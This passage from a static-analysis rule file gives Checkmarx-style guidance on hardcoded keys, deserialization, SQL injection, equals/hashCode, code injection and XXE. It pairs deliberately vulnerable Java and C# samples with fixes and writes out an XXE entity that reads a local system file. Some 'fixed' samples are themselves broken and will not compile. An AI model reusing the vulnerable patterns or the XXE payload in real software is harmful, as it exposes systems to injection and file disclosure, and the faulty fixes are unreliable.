&lt;div&gt;An attacker could gain access to the source code - whether in the source control system, developer workstations, or the server filesystem or product binaries themselves. Once the attacker has gained access to the source code, it is trivial to retrieve the plain text encryption key and use it to decrypt the sensitive data that the application was protecting.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Generic Guidance:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Do not store any sensitive information, such as encryption keys, in plain text.&lt;/li&gt;
&lt;li&gt;Never&amp;#160;hardcode encryption keys in the application source code.&amp;#160;&lt;/li&gt;
&lt;li&gt;Implement proper key management, including dynamically generating random keys, protecting keys, and replacing keys as necessary.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div&gt;Specific Recommendations:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Remove the hardcoded encryption key from the application source code. Instead, retrieve the key from an external, protected store.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Common example of hardcoded encryption key&lt;/h4&gt;&lt;pre&gt;
//Generate a key
string encryptionKey = "EncryptionKey123"

//Encrypt the data
SecretKeySpec keySpec = new SecretKeySpec(encryptionKey.getBytes(), "AES");
Cipher cipher = Cipher.getInstance("AES/CBC/PKCS7Padding");
cipher.init(Cipher.ENCRYPT_MODE, keySpec);
output = cipher.doFinal(input)
&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_4690</key><name>Deserialization_of_Untrusted_Data</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;An attacker that can modify serialized object data, might be able to control the loading and execution of the object code. This could allow the attacker to alter internal object state; consume arbitrary amounts of data-based resources, effectively causing a DoS (Denial of Service); bypass data validation, thus exploiting follow-on vulnerabilities; and possibly even execute arbitrary code on the server.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Applications often need to output object data into a serialized format, in order to persist to disk or stream over the network. The application is then required to deserialize the binary data, and convert it back into internal object data.&lt;/p&gt;
&lt;p&gt;However, no validation is done on the binary input, and the untrusted data is loaded directly into arbitrary internal objects. Furthermore, the deserialization process often executes custom code based on the input data.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;If possible, prefer to avoid deserializing untrusted data in your code.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Where applicable, consider marking object fields as transient, to prevent them from being deserialized.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Implement custom deserialization, and explicitly validate all loaded data and create a new object, instead of just deserializing the object directly.&lt;/li&gt;
&lt;li&gt;Override the ObjectInputStream.resolveClass() method to whitelist deserializable classes, and prevent arbitrary classes from being loaded.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Classes that should not ever be deserialized, yet inherit from a Serializable class, can explicitly declare a final readObject() method, which always throws an exception to prevent loading objects of this class via deserialization.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Consider using digital signatures or HMAC to enforce signature verification and allow deserialization only with an authenticated digital signature.&lt;/li&gt;
&lt;li&gt;If the application includes the commons-collections library, either remove this library if it is not required, otherwise manually patch the JAR file to remove the "InvokerTransformer" class (and thoroughly test that this does not break the application). &amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Bad - Deserializing Untrusted Data&lt;/h4&gt;&lt;pre&gt;public BusinessObject readBusinessObject(HttpServletRequest request) {
    InputStream in = request.getInputStream(); 
    ObjectInputStream ois = new ObjectInputStream(in); 
    
    BusinessObject bizObj = (BusinessObject)ois.readObject(); 
}&lt;/pre&gt;&lt;h4&gt;Good - Customized Deserializer&lt;/h4&gt;&lt;pre&gt;public class BusinessObjectInputStream extends ObjectInputStream {
    public BusinessObjectInputStream(InputStream inputStream) throws IOException {
        super(inputStream);
    }

    @Override
    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) 
                    throws IOException, ClassNotFoundException {
        if (!desc.getName().equals(BusinessObject.class.getName())) {
            throw new InvalidClassException("Unrecognized Class", desc.getName());
        }
        
        return super.resolveClass(desc);
    }
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>CRITICAL</severity><tag>checkmarx-high</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_584</key><name>Heuristic_SQL_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could directly access all of the system's data. Using simple tools and text editing, the attacker would be able to steal any sensitive information stored by the system (such as personal user details or credit cards), and possibly change or erase existing data.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application communicates with its database by sending a textual SQL query. The application creates the query by simply concatenating strings including the user's input. Since the user input is neither checked for data type validity nor subsequently sanitized, the input could contain SQL commands that would be interpreted as such by the database.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values.&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Instead of concatenating strings: a. Use secure database components such as stored procedures, parameterized queries, and object bindings (for commands and parameters). b. An even better solution is to use an ORM library, such as EntityFramework, Hibernate, or iBatis.&lt;/li&gt;
&lt;li&gt;Restrict access to database objects and functionality, according to the Principle of Least Privilege.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
The application creates an SQL query using string obtained from the user
      &lt;/h4&gt;&lt;pre&gt;public class SQLInjection
{
        public void foo(TextBox tbUserName, SqliteConnection connection)
        {	
                string user = tbUserName.Text;
                string sql = "insert into users(name) VALUES (user)"
                MySqlCommand cmd = new MySqlCommand(sql, connection);
                connection.Open();
                SqlDataReader reader = cmd.ExecuteReader();
        }
}&lt;/pre&gt;&lt;h4&gt;
The string obtained from the user is checked for potentially malicious characters
      &lt;/h4&gt;&lt;pre&gt;
class SqlInjectionFixed
{
        public void foo(TextBox tbUserName, SqliteConnection connection)
        {
                string user = tbUserName.Text;
                string sql = "insert into users(name) VALUES (@param1)";
                MySqlCommand cmd = new MySqlCommand(sql, connection);
                cmd.Parameters.AddWithValue(@param1, user);
                connection.Open();
                SqlDataReader reader = cmd.ExecuteReader();
        }
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;The application creates an SQL query using string obtained from the user&lt;/h4&gt;&lt;pre&gt;public class SQL_Injection {
	public static void getUserId(Connection con) {
		System.out.println("enter user name");
		Scanner in = new Scanner(System.in);
		String user = in.nextLine();
		String query = "select user_id from User where user = " + user;
		Statement stmt = con.createStatement();
		ResultSet rs = stmt.executeQuery(query);
	}
}&lt;/pre&gt;&lt;h4&gt;The string obtained from the user is checked for potentially malicious characters&lt;/h4&gt;&lt;pre&gt;public class SQL_Injection_Fixed {
	public static void getUserId(Connection con) {
		System.out.println("enter user name");
		Scanner in = new Scanner(System.in);
		String user = in.nextLine();
		String query = "select user_id from User where user = ?";
		PreparedStatement stmt = con.createStatement(query);
		stmt.setString(1, user);
		ResultSet rs = stmt.executeQuery(query);
	}
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_601</key><name>Just_One_of_Equals_and_Hash_code_Defined</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;If an application class explictly defines an override for only one of the&amp;nbsp;&lt;code&gt;.equals()&lt;/code&gt;&amp;nbsp;and&amp;nbsp;&lt;code&gt;.hashCode()&lt;/code&gt;&amp;nbsp;methods, but not the other, this can negatively affect the application's integrity, and possibly cause inconsistent and unexpected results. This may also affect system performance, when using instances of this class in a hashtable or set.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;The general language contract for implementing classes requires the class to implement both &lt;code&gt;.equals()&lt;/code&gt;&amp;nbsp;and&amp;nbsp;&lt;code&gt;.hashCode()&lt;/code&gt;&amp;nbsp;methods (or neither). This requirement is important for hash tables and other data structures, and to ensure the class behavior is consistent between these methods. However, this class does in fact only implement one of these methods, but not the other, resulting in a broken object.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;Define overriding implementations for both&amp;nbsp;&lt;code&gt;.equals()&lt;/code&gt;&amp;nbsp;and&amp;nbsp;&lt;code&gt;.hashCode()&lt;/code&gt;&amp;nbsp;methods, or not at all. If one is overridden, then both must be.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Note the general principle is: if &lt;code&gt;x.equals(y)&lt;/code&gt;, then &lt;code&gt;x.hashCode()&lt;/code&gt; must be equal to &lt;code&gt;y.hashCode()&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Consider using the &lt;code&gt;EqualsBuilder&lt;/code&gt; and &lt;code&gt;HashCodeBuilder&lt;/code&gt; classes from the Apache Commons library.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Incomplete Implementation&lt;/h4&gt;&lt;pre&gt;public class Foo {
	int fooId; 
  	String name; 

  	@Override
  	public boolean equals(Object obj) {
      	if (obj instanceof Foo) {
          	if (obj == this)
              	return true;
          
          	Foo other = (Foo)obj;
          	return this.fooId.equals(other.fooId);
        }
      	else { 
          	return false;
        }
    }
  	// Two equal objects, with same fooId, will have different hash codes
  	// This can result in duplicate fooIds being added to a HashTable
}&lt;/pre&gt;&lt;h4&gt;Proper Implementation&lt;/h4&gt;&lt;pre&gt;public class Foo {
	int fooId; 
  	String name; 

  	@Override
  	public boolean equals(Object obj) {
      	if (obj instanceof Foo) {
          	if (obj == this)
              	return true;
          
          	Foo other = (Foo)obj;
          	return this.fooId.equals(other.fooId);
        }
      	else { 
          	return false;
        }
    }

  	@Override
  	public int hashCode() {
      	return this.fooId.hashCode(); 
      	// This keeps hashCode consistent with equality 
    }
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1684</key><name>Stored_Code_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could run arbitrary code on the application server host. Depending on the application&amp;rsquo;s OS permissions,these could include:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Database access, such as reading or modifying sensitive data;&lt;/li&gt;
&lt;li&gt;File actions (read / create / modify / delete);&lt;/li&gt;
&lt;li&gt;Changing the website;&lt;/li&gt;
&lt;li&gt;Open a network connection to the attacker&amp;rsquo;s server;&lt;/li&gt;
&lt;li&gt;Decrypt secret data using the application's encryption keys;&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Start and stop system services;&lt;/li&gt;
&lt;li&gt;Complete server takeover.&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;


&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application performs some action by creating and running code that includes untrusted data, which might be under control of a malicious user. If the data contains malicious code, the executed code could contain system-level activities engineered by an attacker, as though the attacker were running code directly on the application server.&lt;/div&gt;


&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;The application should not compile, execute, or evaluate any untrusted code from any external source, including user input, uploaded files, or a database.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;If it is absolutely necessary to include external&amp;nbsp;data in dynamic execution, it is permissible to pass the data as parameters to the code, but do not execute user data directly. &amp;nbsp;&lt;/li&gt;
&lt;li&gt;If it is necessary to pass untrusted data to dynamic execution, enforce very strict data validation. For example, accept only integers between certain values.&lt;/li&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Parameters should be limited to an allowed character set, and non-validated input should be dropped. In addition to characters, check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;If possible, always prefer to whitelist known and trusted input instead of comparing to a blacklist.&lt;/li&gt;
&lt;li&gt;Configure the application to run using a restricted user account that has no unnecessary privileges.&lt;/li&gt;
&lt;li&gt;If possible, isolate all dynamic execution to use a separate, dedicated user account that has privileges only for the specific operations and files used by dynamic execution, according to the Principle of Least Privilege.&lt;/li&gt;
&lt;/ul&gt;

&lt;ul&gt;
&lt;li&gt;If dynamic execution is necessary, run all dynamic code in an external &lt;code&gt;Process&lt;/code&gt;, and pass the untrusted data as a parameter to the process using &lt;code&gt;ProcessBuilder&lt;/code&gt;.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Alternatively, it is possible to perform dynamic execution of code in an isolated sandbox running on a separate thread, by implementing a custom &lt;code&gt;SecurityManager&lt;/code&gt; to implement a restrictive &lt;code&gt;Policy&lt;/code&gt;, and a custom &lt;code&gt;ClassLoader&lt;/code&gt; to allow loading of only permitted classes, from pre-defined sandboxed locations. (Note that this can never be complete protection from sandbox exploits, and all dynamic execution should be avoided if possible.)&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Dynamically Load and Execute Arbitrary Code&lt;/h4&gt;&lt;pre&gt;private void executeDynamicCode_Unsafe() throws Exception {
	int exitCode = 0; 
	
	ResultSet rs = readCodeFromDB(); 
	
	String userClass = rs.getString("Class");
	String userMethod = rs.getString("Method");
	String userParam = rs.getString("Param");
	
	try {
		Class cls = Class.forName(userClass); 
		object result = cls.getMethod(userMethod, String.class).invoke(null, userParam);

		exitCode = Integer.parseInt(result); 
	} catch (Exception ex) {
		handleExceptions(ex);
	}
	
	return exitCode;
}&lt;/pre&gt;&lt;h4&gt;Call to Static Program with Parameters&lt;/h4&gt;&lt;pre&gt;public int executeProcessWithArguments(HttpServletRequest request)
		throws ServletException, IOException {
	int exitCode = 0; 

	ResultSet rs = readCodeFromDB(); 
	String userParam = rs.getString("Param");
	
	try {
		ProcessBuilder builder = new ProcessBuilder(PATH_TO_PRECOMPILED_EXTERNAL_PROGRAM, sanitizeForProcess(userParam));
		Map&lt;String, String&gt; environ = builder.environment();
		setEnvironmentVars(environ);
		
		Process proc = builder.start(); 
		proc.waitFor(MAX_TIMEOUT, TimeUnit.MILLISECONDS);
		
		exitCode = proc.exitValue(); 
	} catch (Exception ex) {
		handleExceptions(ex);
	}
	return exitCode;
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1056</key><name>Potential_Code_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could run arbitrary code on the application server host. Depending on the application&amp;rsquo;s OS permissions,these could include:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Database access, such as reading or modifying sensitive data;&lt;/li&gt;
&lt;li&gt;File actions (read / create / modify / delete);&lt;/li&gt;
&lt;li&gt;Changing the website;&lt;/li&gt;
&lt;li&gt;Open a network connection to the attacker&amp;rsquo;s server;&lt;/li&gt;
&lt;li&gt;Decrypt secret data using the application's encryption keys;&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Start and stop system services;&lt;/li&gt;
&lt;li&gt;Complete server takeover.&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;


&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application performs some action by creating and running code that includes untrusted data, which might be under control of a malicious user. If the data contains malicious code, the executed code could contain system-level activities engineered by an attacker, as though the attacker were running code directly on the application server.&lt;/div&gt;

&lt;p&gt;The attacker can inject arbitrary data via the Action properties, which is later used by executing the action.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;The application should not compile, execute, or evaluate any untrusted code from any external source, including user input, uploaded files, or a database.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;If it is absolutely necessary to include external&amp;nbsp;data in dynamic execution, it is permissible to pass the data as parameters to the code, but do not execute user data directly. &amp;nbsp;&lt;/li&gt;
&lt;li&gt;If it is necessary to pass untrusted data to dynamic execution, enforce very strict data validation. For example, accept only integers between certain values.&lt;/li&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Parameters should be limited to an allowed character set, and non-validated input should be dropped. In addition to characters, check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;If possible, always prefer to whitelist known and trusted input instead of comparing to a blacklist.&lt;/li&gt;
&lt;li&gt;Configure the application to run using a restricted user account that has no unnecessary privileges.&lt;/li&gt;
&lt;li&gt;If possible, isolate all dynamic execution to use a separate, dedicated user account that has privileges only for the specific operations and files used by dynamic execution, according to the Principle of Least Privilege.&lt;/li&gt;
&lt;/ul&gt;

&lt;ul&gt;
&lt;li&gt;If dynamic execution is necessary, run all dynamic code in an external&amp;nbsp;&lt;code&gt;Process&lt;/code&gt;, and pass the external data as a parameter to the process using&amp;nbsp;&lt;code&gt;ProcessBuilder&lt;/code&gt;.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Alternatively, it is possible to perform dynamic execution of code in an isolated sandbox running on a separate thread, by implementing a custom&amp;nbsp;&lt;code&gt;SecurityManager&lt;/code&gt;&amp;nbsp;to implement a restrictive&amp;nbsp;&lt;code&gt;Policy&lt;/code&gt;, and a custom&amp;nbsp;&lt;code&gt;ClassLoader&lt;/code&gt;&amp;nbsp;to allow loading of only permitted classes, from pre-defined sandboxed locations.&amp;nbsp;(Note that this can never be complete protection from sandbox exploits, and all dynamic execution should be avoided if possible.)&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Dynamically Load and Execute Arbitrary Code in Struts Action&lt;/h4&gt;&lt;pre&gt;public ExecuteUnsafeAction extends ActionSupport  {
	private String userCode;
	
	public String getCode() {
		return userCode;
	}
	public void setCode(String userCode) {
		this.userCode = userCode;
	}
	public String execute() throws Exception {
		ScriptEngineManager manager = new ScriptEngineManager();
		ScriptEngine engine = manager.getEngineByName("js");
		Object result = engine.eval(this.userCode);
		
		return String.valueOf(result);
	}
}&lt;/pre&gt;&lt;h4&gt;Call to Static Program with Parameters from Struts Action&lt;/h4&gt;&lt;pre&gt;public ExecuteInProcessAction extends ActionSupport  {
	private String userCode;
	
	public String getCode() {
		return userCode;
	}
	public void setCode(String userCode) {
		this.userCode = userCode;
	}
	public String execute() throws Exception {
		ProcessBuilder builder = new ProcessBuilder(PATH_TO_PRECOMPILED_EXTERNAL_PROGRAM, sanitizeForProcess(this.userCode));
		Map&lt;String, String&gt; environ = builder.environment();
		setEnvironmentVars(environ);
		
		Process proc = builder.start(); 
		proc.waitFor(MAX_TIMEOUT, TimeUnit.MILLISECONDS);
		
		exitCode = proc.exitValue(); 

		return String.valueOf(exitCode);
	}
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_587</key><name>Code_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could run arbitrary code on the application server host. Depending on the application&amp;rsquo;s OS permissions,these could include:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Database access, such as reading or modifying sensitive data;&lt;/li&gt;
&lt;li&gt;File actions (read / create / modify / delete);&lt;/li&gt;
&lt;li&gt;Changing the website;&lt;/li&gt;
&lt;li&gt;Open a network connection to the attacker&amp;rsquo;s server;&lt;/li&gt;
&lt;li&gt;Decrypt secret data using the application's encryption keys;&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Start and stop system services;&lt;/li&gt;
&lt;li&gt;Complete server takeover.&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;


&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application performs some action by creating and running code that includes untrusted data, which might be under control of a malicious user. If the data contains malicious code, the executed code could contain system-level activities engineered by an attacker, as though the attacker were running code directly on the application server.&lt;/div&gt;


&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;The application should not compile, execute, or evaluate any untrusted code from any external source, including user input, uploaded files, or a database.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;If it is absolutely necessary to include external&amp;nbsp;data in dynamic execution, it is permissible to pass the data as parameters to the code, but do not execute user data directly. &amp;nbsp;&lt;/li&gt;
&lt;li&gt;If it is necessary to pass untrusted data to dynamic execution, enforce very strict data validation. For example, accept only integers between certain values.&lt;/li&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Parameters should be limited to an allowed character set, and non-validated input should be dropped. In addition to characters, check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;If possible, always prefer to whitelist known and trusted input instead of comparing to a blacklist.&lt;/li&gt;
&lt;li&gt;Configure the application to run using a restricted user account that has no unnecessary privileges.&lt;/li&gt;
&lt;li&gt;If possible, isolate all dynamic execution to use a separate, dedicated user account that has privileges only for the specific operations and files used by dynamic execution, according to the Principle of Least Privilege.&lt;/li&gt;
&lt;/ul&gt;

&lt;ul&gt;
&lt;li&gt;If dynamic execution is necessary, run all dynamic code in an external &lt;code&gt;Process&lt;/code&gt;, and pass the external data as a parameter to the process using &lt;code&gt;ProcessBuilder&lt;/code&gt;.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Alternatively, it is possible to perform dynamic execution of code in an isolated sandbox running on a separate thread, by implementing a custom &lt;code&gt;SecurityManager&lt;/code&gt; to implement a restrictive &lt;code&gt;Policy&lt;/code&gt;, and a custom &lt;code&gt;ClassLoader&lt;/code&gt; to allow loading of only permitted classes, from pre-defined sandboxed locations.&amp;nbsp;(Note that this can never be complete protection from sandbox exploits, and all dynamic execution should be avoided if possible.)&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Dynamically Load and Execute Arbitrary Code&lt;/h4&gt;&lt;pre&gt;private void executeDynamicCode_Unsafe(HttpServletRequest request) 
		throws ServletException, IOException {
	int exitCode = 0; 
	String userClass = request.getParameter("Class");
	String userMethod = request.getParameter("Method");
	String userParam = request.getParameter("Param");
  
	try {
		Class cls = Class.forName(userClass); 
		object result = cls.getMethod(userMethod, String.class).invoke(null, userParam);

		exitCode = Integer.parseInt(result); 
	} catch (Exception ex) {
		handleExceptions(ex);
	}
	
	return exitCode;
}&lt;/pre&gt;&lt;h4&gt;Call to Static Program with Parameters&lt;/h4&gt;&lt;pre&gt;public int executeProcessWithArguments(HttpServletRequest request)
		throws ServletException, IOException {
	int exitCode = 0; 
	String userParam = request.getParameter("Param");
	
	try {
		ProcessBuilder builder = new ProcessBuilder(PATH_TO_PRECOMPILED_EXTERNAL_PROGRAM, sanitizeForProcess(userParam));
		Map&lt;String, String&gt; environ = builder.environment();
		setEnvironmentVars(environ);
		
		Process proc = builder.start(); 
		proc.waitFor(MAX_TIMEOUT, TimeUnit.MILLISECONDS);
		
		exitCode = proc.exitValue(); 
	} catch (Exception ex) {
		handleExceptions(ex);
	}
	return exitCode;
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>CRITICAL</severity><tag>checkmarx-high</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3522</key><name>Improper_Restriction_of_XXE_Ref</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An&amp;#160;application that will parse and replace DTD entity references, in an XML document that the user controls, can allow an attacker to craft an XML document to read arbitrary server files. This XML document could contain an XML entity reference, which refers to an embedded DTD entity definition that points to any local file. This would enable the attacker to retrieve any arbitrary system file on the server.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;div&gt;An attacker could upload an XML document that contains a DTD declaration, in particular an entity defintion that refers to a local file on the server's disk, e.g. &lt;code&gt;&amp;lt;!ENTITY xxe SYSTEM "file:///c:/boot.ini"&amp;gt;&lt;/code&gt;. The attacker would then include an XML entity reference that refers back to that entity definition, e.g. &lt;code&gt;&amp;lt;div&amp;gt;&amp;amp;xxe;&amp;lt;/div&amp;gt;&lt;/code&gt; . If the parsed XML document is then returned to the user, the result will include the contents of the sensitive system file.&amp;#160;&lt;/div&gt;
&lt;div&gt;This is caused by the XML parser, which is configured to automatically parse DTD declarations and resolve entity references, instead of disabling both DTD and external references altogether.&amp;#160;&lt;/div&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Generic Guidance:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Avoid processing user input directly, where possible.&amp;#160;&lt;/li&gt;
&lt;li&gt;If necessary to receive XML from the user, ensure the XML parser is restricted and constrained.&amp;#160;&lt;/li&gt;
